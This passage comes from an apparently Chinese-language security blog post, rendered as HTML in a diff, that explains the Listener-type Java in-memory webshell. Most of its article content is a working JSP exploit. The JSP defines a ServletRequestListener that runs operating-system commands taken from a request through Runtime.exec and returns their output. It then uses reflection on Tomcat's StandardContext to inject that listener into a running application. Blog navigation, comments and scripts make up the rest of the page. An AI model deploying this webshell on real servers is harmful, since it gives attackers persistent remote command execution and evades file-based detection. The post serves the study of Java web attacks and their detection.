+<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #E5C07B">requestField</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAccessible</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);  </span></span>
+<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #E5C07B">Request</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">request</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> (Request) </span><span style="color: #E5C07B">requestField</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">get</span><span style="color: #ABB2BF">(requestFacade);  </span></span>
+<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #E5C07B">Response</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">response</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">request</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getResponse</span><span style="color: #ABB2BF">();  </span></span>
+<span class="line"><span style="color: #ABB2BF">  </span></span>
+<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (cmd </span><span style="color: #56B6C2">!=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">){  </span></span>
+<span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">InputStream</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">inputStream</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Runtime</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getRuntime</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">exec</span><span style="color: #ABB2BF">(cmd).</span><span style="color: #61AFEF">getInputStream</span><span style="color: #ABB2BF">();  </span></span>
+<span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">i</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">;  </span></span>
+<span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #C678DD">byte</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75">bytes</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">byte</span><span style="color: #ABB2BF">[</span><span style="color: #D19A66">1024</span><span style="color: #ABB2BF">];  </span></span>
+<span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #C678DD">while</span><span style="color: #ABB2BF"> ((i</span><span style="color: #56B6C2">=</span><span style="color: #E5C07B">inputStream</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">read</span><span style="color: #ABB2BF">(bytes)) </span><span style="color: #56B6C2">!=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">){  </span></span>
+<span class="line"><span style="color: #ABB2BF">                        </span><span style="color: #E5C07B">response</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getWriter</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">write</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">String</span><span style="color: #ABB2BF">(bytes,</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">,i));  </span></span>
+<span class="line"><span style="color: #ABB2BF">                        </span><span style="color: #E5C07B">response</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getWriter</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">write</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\r\n</span><span style="color: #98C379">&quot;</span><span style="color: #ABB2BF">);  </span></span>
+<span class="line"><span style="color: #ABB2BF">                    }  </span></span>
+<span class="line"><span style="color: #ABB2BF">                }  </span></span>
+<span class="line"><span style="color: #ABB2BF">            }</span><span style="color: #C678DD">catch</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">Exception</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">e</span><span style="color: #ABB2BF">){  </span></span>
+<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #E5C07B">e</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">printStackTrace</span><span style="color: #ABB2BF">();  </span></span>
+<span class="line"><span style="color: #ABB2BF">            }  </span></span>
+<span class="line"><span style="color: #ABB2BF">        }</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Override</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> requestDestroyed</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">ServletRequestEvent</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">sre</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{  </span></span>
+<span class="line"><span style="color: #ABB2BF">        }</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #ABB2BF">}</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #56B6C2">%&gt;</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #56B6C2">&lt;%</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">ServletContext</span><span style="color: #E06C75"> servletContext </span><span style="color: #56B6C2">=</span><span style="color: #E06C75">  </span><span style="color: #E5C07B">request</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getServletContext</span><span style="color: #ABB2BF">();</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">Field</span><span style="color: #E06C75"> applicationContextField </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">servletContext</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getClass</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getDeclaredField</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;context&quot;</span><span style="color: #ABB2BF">);</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">applicationContextField</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAccessible</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">ApplicationContext</span><span style="color: #E06C75"> applicationContext </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> (ApplicationContext) </span><span style="color: #E5C07B">applicationContextField</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">get</span><span style="color: #ABB2BF">(servletContext);</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">Field</span><span style="color: #E06C75"> standardContextField </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">applicationContext</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getClass</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getDeclaredField</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;context&quot;</span><span style="color: #ABB2BF">);</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">standardContextField</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAccessible</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">StandardContext</span><span style="color: #E06C75"> standardContext </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> (StandardContext) </span><span style="color: #E5C07B">standardContextField</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">get</span><span style="color: #ABB2BF">(applicationContext);</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75">	</span><span style="color: #7F848E; font-style: italic">//获取当前应用已有的 Listener 列表。</span></span>
+<span class="line"><span style="color: #E06C75">	</span><span style="color: #7F848E; font-style: italic">//转成 ArrayList 并新增一个 ListenerMemShell 对象</span></span>
+<span class="line"><span style="color: #E06C75">	</span><span style="color: #7F848E; font-style: italic">//调用 setApplicationEventListeners() 覆盖原来的监听器数组，把内存马 Listener 注入进去了</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">Object</span><span style="color: #E06C75">[] objects </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">standardContext</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getApplicationEventListeners</span><span style="color: #ABB2BF">();</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">List</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75"> listeners </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Arrays</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">asList</span><span style="color: #ABB2BF">(objects);</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">List</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75"> arrayList </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">ArrayList</span><span style="color: #E06C75">(listeners)</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">arrayList</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">add</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">ListenerMemShell</span><span style="color: #ABB2BF">());</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">standardContext</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setApplicationEventListeners</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">arrayList</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">toArray</span><span style="color: #ABB2BF">());</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #56B6C2">%&gt;</span></span></code></pre></div></div></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260409110422301.png" srcset="/img/loading.gif" lazyload alt="image-20260409110415120"></p>
+<p><img src="/../../../../AppData/Roaming/Typora/typora-user-images/image-20260409110422933.png" srcset="/img/loading.gif" lazyload alt="image-20260409110422933"></p>
+<h1 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h1><p>Listener 型内存马比 Filter 型内存马的实现更为简易的多，从难度上来说，可以把 Listener 型内存马需要实现的步骤看成是 Filter 型内存马的一部分。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Java/" class="category-chain-item">Java</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Java/Java%E5%AE%89%E5%85%A8/" class="category-chain-item">Java安全</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Java%E5%AE%89%E5%85%A8/" class="print-no-link">#Java安全</a>
+      
+        <a href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/" class="print-no-link">#内存马</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>内存马系列--Listener型</div>
+      <div>http://example.com/2026/04/12/内存马系列--Listener型/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Piggy Sprint</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年4月12日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/04/12/%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97--Servlet%E5%9E%8B/" title="内存马系列--Servlet型">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">内存马系列--Servlet型</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/04/12/%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97--Filter%E5%9E%8B/" title="内存马系列--Filter型">
+                        <span class="hidden-mobile">内存马系列--Filter型</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"7H0Tkmd6gbla1cOeZ7rS44zF-gzGzoHsz","appKey":"byZ7eSN7DH9MXIyDyXwXE8SE","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div style="font-size: 0.85rem"> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/custom/RunTime/RunTime.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="/custom/LoadingBar/pace.min.js"></script>
+<script src="/js/scrollAnimation.js"></script>
+<script src="/js/snow.js"></script>
+<script src="/custom/ReadingProgress/ReadingProgress.js"></script>
+<script src="/js/DynamicLine.js"></script>
+<script src="/js/RandomBanner.js"></script>
+<script src="/js/Background.js"></script>
+<script src="/js/Sidebar.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<!-- hexo injector body_end start -->
+<script src="https://cdn.jsdelivr.net/npm/hexo-shiki-plugin@latest/lib/codeblock.js"></script>
+
+  <script>
+  const CODE_CONFIG = {
+    beautify: true,
+    highlightCopy: true,
+    highlightLang: true,
+    highlightHeightLimit: 360,
+    isHighlightShrink: false,
+    copy: {
+      success: 'Copy Success',
+      error: 'Copy Error',
+      noSupport: 'Browser Not Support',
+    }
+  };
+  console.log(
+    `%c hexo-shiki-plugin %c v1.0.27 %c https://github.com/nova1751/hexo-shiki-plugin`,
+    "color: #fff; background: #5f5f5f",
+    "color: #fff; background: #80c8f8",
+    ""
+  );
+  </script>
+  <!-- hexo injector body_end end --></body>
+</html>
